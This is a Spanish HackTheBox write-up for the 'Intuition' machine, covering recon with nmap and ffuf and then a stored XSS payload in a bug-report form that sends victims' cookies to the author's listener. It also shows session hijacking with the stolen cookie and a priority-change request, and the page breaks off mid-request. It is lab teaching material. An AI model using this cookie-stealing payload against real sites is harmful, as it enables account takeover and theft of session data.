<!doctype html><html lang=es><head><title>HTB Intuition WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackThebox 'Intuition' WriteUp"><meta name=keywords content="blog,pentesting,hacking"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Intuition WriteUp"><meta name=twitter:description content="HackThebox 'Intuition' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/es/posts/intuition/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Intuition WriteUp"><meta property="og:description" content="HackThebox 'Intuition' WriteUp"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-14T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-14T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Hard"><meta property="article:tag" content="Winrm"><meta property="article:tag" content="Ffuf"><link rel=canonical href=https://gunzf0x.github.io/pentesting/es/posts/intuition/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting/es>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/es/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/projects/>Proyectos</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/es/contact/>Contacto</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/posts/intuition/>üá¨üáß</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/es/posts/intuition/>HTB Intuition WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-14T00:00:00Z>14 septiembre, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
31 minutos de lectura.</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/es/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hard/>Hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/winrm/>Winrm</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ffuf/>Ffuf</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/xss/>Xss</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/flask/>Flask</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/python/>Python</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/go/>Go</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/lfi/>Lfi</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ftp/>Ftp</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/hashcat/>Hashcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/linpeas/>Linpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/reverse-engineering/>Reverse Engineering</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ghidra/>Ghidra</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ansible-galaxy/>Ansible Galaxy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/suricata/>Suricata</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sqlite/>Sqlite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/session-hijacking/>Session Hijacking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/es/tags/ssrf/>Ssrf</a></span></div></div></header><div class=post-content><h1 id=intuition----hackthebox>Intuition &ndash; HackTheBox
<a class=heading-link href=#intuition----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty / Dificultad: <em>Hard</em> /<em>Dif√≠cil</em></li><li>Platform / Plataforma: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Intuition&rsquo; Avatar" src=/pentesting/images/Intuition_avatar.png></p><hr><h2 id=resumen>Resumen
<a class=heading-link href=#resumen><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>&ldquo;Intuition&rdquo; es una m√°quina de dificultad dif√≠cil de la plataforma <code>HackTheBox</code>. Luego de una inspecci√≥n inicial de la p√°gina web de la m√°quina v√≠ctima, somos capaces de encontrar algunos subdominios. Uno de √©stos tiene un formulario vulnerable a <code>Cross-Site Scripting</code> (<code>XSS</code>), lo cual nos permite tener acceso a un panel de desarrollador. Dentro de esta panel, somos capaces de obtener una cookie de admin a trav√©s de una peque√±a vulnerabilidad <code>IDOR</code>. Una vez dentro del panel de administrador, somos capaces de generar reportes <code>PDF</code>. Este servicio usa una librer√≠a vulnerable a <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-24329 class=external-link target=_blank rel=noopener>CVE-2023-24329</a>, la cual nos permite leer archivos enel sistema. Es as√≠ como somos capaces de leer archivos dentro de un servicio <code>FTP</code> interno y ganar as√≠ acceso inicial a la m√°quina v√≠ctima. Una vez dentro, somos capaces de encontrar credenciales desde una base de datos <code>SQLite</code>, con lo cual tenemos acceso a nuevos recursos en el servicio <code>FTP</code>. Dentro de estos archivos, somos capaces de encontrar un c√≥digo de autenticacion. Somos entonces capaces de leer algunos logs y encontrar la contrase√±a de un nuevo usuario. Este nuevo usuario puede correr un binario con <code>sudo</code>. Luego de una peque√±a ingenier√≠a inversa, somos capaces de inyectar c√≥digo a trav√©s de este binario y ganar as√≠ total control sobre el sistema.</p><hr><h2 id=user--usuario>User / Usuario
<a class=heading-link href=#user--usuario><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Empezando con un escaneo con <code>Nmap</code>, √©ste s√≥lo muestra 2 puertos abiertos: <code>22</code> <code>SSH</code> y <code>80</code> <code>HTTP</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.15 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 13:57 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.15
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.18s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://comprezzor.htb/
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.63 seconds
</span></span></span></code></pre></div><p>Del escaneo noto que el sitio <code>http://10.10.11.15</code> redirige a <code>http://comprezzor.htb</code>. De manera que agrego este nuevo dominio al archivo <code>/etc/hosts</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.15 comprezzor.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><p>Ya agregado, visitamos <code>http://comprezor.htb</code> y podemos ver el siguiente sitio web:</p><p><img alt="Intuition 1" src=/pentesting/images/Intuition_1.png></p><p>El sitio web presenta una herramienta que puede ser usado para comprimir archivos. Podemos subir archivos <code>.txt</code>, <code>.pdf</code>, y <code>.docx</code>. Intento subir algunos archivos con payloads, pero no funcionan.</p><p>Es entonces que buscamos por subdominios (ya que el sitio podr√≠a estar aplicando <code>vhosting</code>) usando la herramienta <code>ffuf</code>. Corremos entonces:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://comprezzor.htb/ -H &#39;Host: FUZZ.comprezzor.htb&#39; -fs 178 -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://comprezzor.htb/
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Header           : Host: FUZZ.comprezzor.htb
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 55
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response size: 178
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 159ms]
</span></span></span><span class=line><span class=cl><span class=go>report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 242ms]
</span></span></span><span class=line><span class=cl><span class=go>dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 155ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [4989/4989] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
</span></span></span></code></pre></div><p>y obtenemos 3 subdominios: <code>auth</code>, <code>report</code> y <code>dashboard</code>.</p><p>Agrego estos nuevos subdominios a mi archivo <code>/etc/hosts</code>. De manera que ahora √©ste se ve como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ tail -n1 /etc/hosts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10.10.11.15 comprezzor.htb auth.comprezzor.htb report.comprezzor.htb dashboard.comprezzor.htb
</span></span></span></code></pre></div><p>Una vez agregado los subdominios, visitamos <code>http://report.comprezzor.htb</code>. Podemos ver un sitio web el cual nos permite reportar bugs:</p><p><img alt="Intuition 2" src=/pentesting/images/Intuition_2.png></p><p>Clickeando en <code>Report a Bug</code> redirige a <code>http://auth.comprezzor.htb/login</code> dado que no estamos registrados.</p><p><img alt="Intuition 3" src=/pentesting/images/Intuition_3.png></p><p>Dado que no tengo credenciales y las credenciales por defecto (como <code>admin:admin</code>, <code>guest:guest</code>, <code>root:root</code>, etc) no funcionan decido crear/registrar una nueva cuenta. Una vez registrada la cuenta me logueo en el panel. Una vez logueado, somos redirigidos a <code>http://report.comprezzor.htb</code> (donde tambi√©n puedo ver el mensaje <code>Logged in succesfully!</code>). Ahora, si clickeo en <code>Report a Bug</code> podemos ver el siguiente panel:</p><p><img alt="Intuition 4" src=/pentesting/images/Intuition_4.png></p><p>Para ver si podemos inyectar algo en este formulario, inicializo <code>Burpsuite</code> para interceptar la petici√≥n enviada en el formulario. Enviamos el reporte y es interceptado, donde obtenemos una petici√≥n por <code>POST</code> como la siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/report_bug</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>report.comprezzor.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>35</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://report.comprezzor.htb</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://report.comprezzor.htb/report_bug</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImd1bnpmMHgiLCAicm9sZSI6ICJ1c2VyIn18ZDFjZWE0Zjg1ODNkNGE5N2FiN2VlZjM0ZTNkMzRkMmYyNGIyMTE4ZWY5M2EyNDBmOTA0MTUyM2JhNjU0NzI5Ng==</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>report_title=title&amp;description=test
</span></span></code></pre></div><p>donde puedo ver 2 par√°metros: <code>report_title</code> y <code>description</code>. Para jugar con estos par√°metros env√≠o esta petici√≥n al <code>Repeater</code> de <code>Burpsuite</code>.</p><p>Luego de algunas inyecciones, la siguiente inyecci√≥n con <code>Cross Site Scripting</code> (<code>XSS</code>) funciona en el par√°metro <code>description</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span><span class=nb>document</span><span class=p>.</span><span class=nx>location</span><span class=o>=</span><span class=s2>&#34;http://10.10.16.6:8000/xss-76.js?cookie=&#34;</span><span class=o>+</span><span class=nx>btoa</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>);</span><span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></div><p>donde <code>10.10.16.6</code> es mi IP de atacante y <code>8000</code> es el puerto en el cual ya estoy en escucha con <code>netcat</code>. Podemos ver m√°s payloads de <code>XSS</code> en <code>PayloadAllTheThings</code> en <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss class=external-link target=_blank rel=noopener>su repositorio</a>.</p><p>Por tanto, la petici√≥n por <code>POST</code> enviada a trav√©s de <code>Burpsuite</code> se ve como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/report_bug</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>report.comprezzor.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>144</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://report.comprezzor.htb</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://report.comprezzor.htb/report_bug</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImd1bnpmMHgiLCAicm9sZSI6ICJ1c2VyIn18ZDFjZWE0Zjg1ODNkNGE5N2FiN2VlZjM0ZTNkMzRkMmYyNGIyMTE4ZWY5M2EyNDBmOTA0MTUyM2JhNjU0NzI5Ng==</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>report_title=test&amp;description=&lt;script&gt;document.location%3d&#34;http%3a//10.10.16.6%3a8000/xss-76.js%3fcookie%3d&#34;%2bbtoa(document.cookie)%3b&lt;/script&gt;
</span></span></code></pre></div><p><img alt="Intuition 9" src=/pentesting/images/Intuition_9.png></p><p>y en mi listener con <code>netcat</code> obtengo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 8000 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.15] 60714
</span></span></span><span class=line><span class=cl><span class=go>GET /xss-76.js?cookie=dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA== HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=go>Host: 10.10.16.6:8000
</span></span></span><span class=line><span class=cl><span class=go>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
</span></span></span><span class=line><span class=cl><span class=go>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span></span><span class=line><span class=cl><span class=go>Accept-Language: en-US,en;q=0.5
</span></span></span><span class=line><span class=cl><span class=go>Accept-Encoding: gzip, deflate
</span></span></span><span class=line><span class=cl><span class=go>Referer: http://dashboard.comprezzor.htb/
</span></span></span><span class=line><span class=cl><span class=go>Connection: keep-alive
</span></span></span><span class=line><span class=cl><span class=go>Upgrade-Insecure-Requests: 1
</span></span></span></code></pre></div><p>Decodeando el mensaje que est√° en <code>base64</code>, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo -n &#39;dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA==&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
</span></span></span></code></pre></div><p>Tenemos una cookie.</p><p>Noto del listener de <code>netcat</code> que el <code>Referer</code> es <code>http://dashboard.comprezzor.htb/</code>. Visitando esta p√°gina redirige a <code>http://auth.comprezzor.htb/login</code> (el panel de login que ya hab√≠amos visitado previamente). En mi browser de internet <code>Firefox</code>, si chequeo qu√© tengo en el <code>Storage</code>/<code>Almacenamiento</code> (presionando <code>Ctrl+Shift+I</code>) veo que tenemos una cookie llamada <code>user_data</code>, el cual es el mismo nombre de la cookie obtenida a trav√©s de <code>XSS</code>. Por tanto, reemplazo el valor de la cookie <code>user_data</code> con el nuevo valor hallado y re-visito <code>http://dashboard.comprezzor.htb</code>. Ahora podemos ver una especie de panel que muestra m√∫ltiples reportes:</p><p><img alt="Intuition 5" src=/pentesting/images/Intuition_5.png></p><p>Al lado izquierdo podemos hacer click en los IDs de los reportes <code>1</code>, <code>2</code>, <code>3</code> y as√≠. Cuando clickeo en uno de ellos podemos ver, por ejemplo:</p><p><img alt="Intuition 6" src=/pentesting/images/Intuition_6.png></p><p>Noto que, cuando subo un reporte a <code>http://report.comprezzor.htb/report_bug</code> <em>usando la cookie obtenida</em>, estamos subiendo un reporte como el usuario <code>adam</code>; dado que si recargo la p√°gina ahora tenemos:</p><p><img alt="Intuition 7" src=/pentesting/images/Intuition_7.png></p><p>Noto, adem√°s, que todos los reportes tienen un par√°metro <code>Priority</code>. Como se puede apreciar en la imagen que muestra un reporte, we podemos definir la prioridad de un reporte como <code>Low</code> o <code>High</code> clickeando en la opci√≥n correspondiente. Asumo que las prioridades altas (<code>High</code>) tienen un trato especial y, por ende, son revisadas por un usuario diferente de <code>adam</code>. Env√≠o un reporte como el usuario <code>adam</code> con nombre <code>test2</code> y el payload de <code>XSS</code> que hemos usado previamente. Si volvemos a chequear la p√°gina, nuestro reporte est√° all√≠:</p><p><img alt="Intuition 8" src=/pentesting/images/Intuition_8.png></p><p>El problema yace en que cuando clickeo en <code>25</code> (la ID del reporte que contiene el payload <code>XSS</code>) √©ste ejecuta el payload y me retorna la cookie de <code>adam</code> (la cual ya tenemos). Dado que queremos cambiar la prioridad de nuestro payload de <code>0</code> (<code>Low</code>) a <code>1</code> (<code>High</code>) abro otro de los reportes que ya existen, clickeo en <code>Set High Priority</code> e intercepto la petici√≥n enviada con <code>Burpsuite</code>. La petici√≥n <code>POST</code> enviada es:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/change_priority?report_id=3&amp;priority_level=1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>dashboard.comprezzor.htb</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>0</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://dashboard.comprezzor.htb</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://dashboard.comprezzor.htb/report/3</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4==</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
